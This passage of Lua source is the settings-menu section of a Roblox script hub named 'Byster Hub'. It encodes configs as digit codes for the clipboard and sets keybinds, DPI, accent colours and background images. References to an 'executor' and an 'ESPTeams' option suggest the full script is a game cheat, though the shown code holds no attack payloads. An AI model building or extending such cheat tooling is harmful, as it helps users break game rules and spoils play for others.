		Cos.Errors=(Cos.Errors or "").." [CodeCFG] groupbox creation failed; "
		pcall(function() Library:Notify({Title="Byster Hub",Description="Code CFG UI failed to build",Time=8}) end)
	end
	if ShareGroup then
	pcall(function()
		ShareGroup:AddLabel("Save CFG copies the digits of your CURRENT settings to the clipboard. Paste them into CFG Code on any PC and press Load CFG to apply the same settings.")
	end)
	pcall(function() ShareGroup:AddLabel("Build: 04.11.2026") end)
	local function CosUiEncodeReal(json)
		if type(json) ~= "string" or #json == 0 then return nil, "empty config" end
		local out = {}
		for i = 1, #json do
			out[#out + 1] = string.format("%03d", string.byte(json, i))
		end
		return table.concat(out)
	end
	local function CosUiDecodeReal(code)
		code = tostring(code or "")
		code = code:gsub("%c","")
		code = code:gsub("[^%d]","")
		if #code == 0 then return nil, "empty code" end
		if #code % 3 ~= 0 then return nil, "invalid code length" end
		local out = {}
		for i = 1, #code, 3 do
			local b = tonumber(code:sub(i, i + 2))
			if not b or b < 32 or b > 255 then return nil, "invalid code" end
			out[#out + 1] = string.char(b)
		end
		local json = table.concat(out)
		return json
	end
	local function CosUiNotify(desc)
		pcall(function() Library:Notify({Title="Byster Hub",Description=desc,Time=6}) end)
	end
	ShareGroup:AddButton({Text="Save CFG (copy code)",Func=function()
		task.spawn(function()
			CosUiSafe("save", function()
				local saved = false
				pcall(function() saved = (SaveManager:Save("__CodeCfgCache") == true) end)
				if not saved then
					CosUiNotify("Save failed (executor has no write access)")
					return
				end
				local ok, data = SaveManager:ExportConfig("__CodeCfgCache")
				pcall(function() SaveManager:Delete("__CodeCfgCache") end)
				if not ok then
					CosUiNotify("Export failed: "..tostring(data))
					return
				end
				local code, encErr = CosUiEncodeReal(data)
				if not code then
					CosUiNotify("Encode failed: "..tostring(encErr))
					return
				end
				local setclip = setclipboard or toclipboard
				if setclip then
					pcall(setclip, code)
				else
					CosUiNotify("Clipboard not available on this executor")
					return
				end
				CosUiNotify("CFG code copied: "..tostring(#code).." digits")
			end)
		end)
	end})
	ShareGroup:AddInput("CfgCodeInput",{Text="CFG Code",Default="",Finished=true,Placeholder="Paste digit code here...",AllowEmpty=true,Callback=function(v) end})
	ShareGroup:AddButton({Text="Load CFG (from code)",Func=function()
		task.spawn(function()
			CosUiSafe("load", function()
				local raw = (Options.CfgCodeInput and Options.CfgCodeInput.Value) or ""
				local json, err = CosUiDecodeReal(raw)
				if not json then
					CosUiNotify("Invalid code: "..tostring(err))
					return
				end
				local ok, lerr = SaveManager:ImportConfig(json)
				if ok then
					CosUiNotify("CFG loaded from code")
					pcall(function() Options.CfgCodeInput:SetValue("") end)
				else
					CosUiNotify("Import failed: "..tostring(lerr))
				end
			end)
		end)
	end})
	end
end
end)
if not CosUiOk then
	Cos.Errors=(Cos.Errors or "").." [ui] "..tostring(CosUiErr).."; "
	pcall(function() Library:Notify({Title="Byster Hub",Description="UI load error: "..tostring(CosUiErr),Time=10}) end)
end
local MenuGroup=Tabs["UI Settings"]:AddLeftGroupbox("Menu","wrench")
MenuGroup:AddToggle("KeybindMenuOpen",{Text="Show Keybind List",Default=Library.KeybindFrame.Visible,Callback=function(v) Library.KeybindFrame.Visible=v end})
MenuGroup:AddDropdown("NotificationSide",{Values={"Left","Right"},Default="Right",Multi=false,Text="Notification Side",AllowNull=false,Callback=function(v) Library:SetNotifySide(v) end})
MenuGroup:AddDropdown("DPIDropdown",{Values={"75%","100%","125%","150%","175%","200%"},Default="100%",Multi=false,Text="DPI Scale",AllowNull=false,Callback=function(v) Library:SetDPIScale(tonumber((v:gsub("%%","")))) end})
MenuGroup:AddDivider()
MenuGroup:AddLabel("Menu keybind"):AddKeyPicker("MenuKeybind",{Default="RightShift",NoUI=true,Text="Menu keybind"})
MenuGroup:AddButton({Text="Unload Menu",Risky=true,Func=function() Environment.BysterHub.Unload() end})

local AppGroup=Tabs["UI Settings"]:AddRightGroupbox("Appearance","monitor")
tg(AppGroup,"RainbowUI","Rainbow UI",S,"Rainbow","Cycles the accent color of the menu and watermark",function(v) if not v then setAccent(S.AccentColor) end end)
sl(AppGroup,"RainbowSpeed","Rainbow Speed",S,"RainbowSpeed",1,30,0)
col(AppGroup:AddLabel("Static Accent"),"AccentColor","Static Accent",S,"AccentColor",function(v) if not S.Rainbow then setAccent(v) end end)
AppGroup:AddToggle("WatermarkVisible",{Text="Show Watermark",Default=true,Callback=function(v) WatermarkGui.Enabled=v end})

do
 local G=Tabs["UI Settings"]:AddRightGroupbox("Background Images","image")
 tg(G,"BgEnabled","Show Images",S,"BgEnabled")
 tg(G,"BgDrag","Drag Images With Mouse",S,"BgDrag")
 for _,s in ipairs(MenuFX.Slots) do
  G:AddDropdown(s.Key,{Values=MenuFX.Choices,Default=MenuFX.Value(s),Multi=false,Text=s.Text,AllowNull=false,Callback=function(v) if v then MenuFX.Select(s.Id,v) end end})
 end
 sl(G,"BgSize","Image Size",S,"BgSize",120,520,0," px")
 sl(G,"BgOpacity","Image Opacity",S,"BgOpacity",10,100,0,"%")
 G:AddButton({Text="Reset Image Positions",Func=function() MenuFX.ResetPositions() end})
 G:AddDivider()
 tg(G,"MenuBlur","Blur Game While Menu Is Open",S,"MenuBlur")
 sl(G,"MenuBlurSize","Blur Strength",S,"MenuBlurSize",0,56,0)
 for _,s in ipairs(MenuFX.Slots) do MenuFX.Select(s.Id,MenuFX.Value(s)) end
end

Library.ToggleKeybind=Options.MenuKeybind
SaveManager:SetLibrary(Library)
SaveManager:IgnoreThemeSettings()
SaveManager:SetIgnoreIndexes({"MenuKeybind","ESPTeams","W_Preset","W_QuickTime","FriendInput","FriendRemove"})
ThemeManager:SetFolder("BysterHub")
SaveManager:SetFolder("BysterHub")
SaveManager:BuildConfigSection(Tabs["UI Settings"])
ThemeManager:ApplyToTab(Tabs["UI Settings"])
SaveManager:LoadAutoloadConfig()

pcall(rebuildTeamSel)

local function roundBigFrames(R)
 local Root=Library.ScreenGui
 if not Root then return end
 for _,d in ipairs(Root:GetDescendants()) do
  if d:IsA("UICorner") then
   local P=d.Parent
   if P and P:IsA("GuiObject") then
    local z=P.AbsoluteSize
    if z.X>=250 and z.Y>=60 then d.CornerRadius=UDim.new(0,R) end
   end
  end
 end
end
for _,t in ipairs({1,4}) do
 task.delay(t,function() if Alive then pcall(roundBigFrames,14) end end)
end

Library:Notify({Title="Byster Hub",Description="Loaded",Time=4})
